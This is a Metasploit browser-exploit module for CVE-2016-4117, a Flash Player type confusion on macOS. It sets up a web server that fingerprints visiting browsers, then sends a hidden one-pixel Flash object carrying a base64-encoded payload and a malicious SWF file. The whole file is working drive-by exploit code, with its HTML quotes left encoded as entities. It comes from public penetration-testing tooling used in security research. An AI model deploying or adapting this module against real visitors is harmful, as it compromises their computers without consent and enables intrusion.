# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Adobe Flash Player DeleteRangeTimelineOperation Type-Confusion&#039;,
      &#039;Description&#039;         => %q(
       This module exploits a type confusion on Adobe Flash Player, which was
       originally found being successfully exploited in the wild. This module
       has been tested successfully on:
         macOS Sierra 10.12.3,
         Safari and Adobe Flash Player 21.0.0.182,
         Firefox and Adobe Flash Player 21.0.0.182.
      ),
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Genwei Jiang&#039;, # FireEye original blog details on the vulnerability
          &#039;bcook-r7&#039;      # Imported Metasploit module
        ],
      &#039;References&#039;          =>
        [
          [&#039;CVE&#039;, &#039;2016-4117&#039;],
          [&#039;BID&#039;, &#039;90505&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2016/05/cve-2016-4117-flash-zero-day.html&#039;],
          [&#039;URL&#039;, &#039;http://www.securitytracker.com/id/1035826&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsa16-02.html&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsb16-15.html&#039;],
        ],
      &#039;Payload&#039;             =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;            => [&#039;osx&#039;],
      &#039;BrowserRequirements&#039; =>
        {
          source: /script|headers/i,
          os_name: lambda do |os|
            os =~ OperatingSystems::Match::MAC_OSX
          end,
          ua_name: lambda do |ua|
            case target.name
            when &#039;Mac OS X&#039;
              return true if ua == Msf::HttpClients::SAFARI
              return true if ua == Msf::HttpClients::FF
            end

            false
          end,
          flash: lambda do |ver|
            case target.name
            when &#039;Mac OS X&#039;
              return true if Gem::Version.new(ver) <= Gem::Version.new(&#039;21.0.0.182&#039;)
            end

            false
          end
        },
      &#039;Targets&#039;             =>
        [
          [
            &#039;Mac OS X&#039;, {
              &#039;Platform&#039; => &#039;osx&#039;,
              &#039;Arch&#039; => ARCH_X64
            }
          ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => &#039;Apr 27 2016&#039;,
      &#039;DefaultTarget&#039;       => 0))
  end

  def exploit
    @swf = create_swf

    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri.end_with? &#039;swf&#039;
      print_status(&#039;Sending SWF...&#039;)
      send_response(cli, @swf, &#039;Content-Type&#039; => &#039;application/x-shockwave-flash&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;)
      return
    end

    print_status(&#039;Sending HTML...&#039;)
    send_exploit_html(cli, exploit_template(cli, target_info), &#039;Pragma&#039; => &#039;no-cache&#039;)
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(3..7)}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)

    if target.name.include? &#039;osx&#039;
      platform_id = &#039;osx&#039;
    end
    html_template = %(<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>" Play="true"/>
    </object>
    </body>
    </html>
    )

    return html_template, binding
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2016-4117&#039;, &#039;msf.swf&#039;)
    File.binread(path)
  end
end

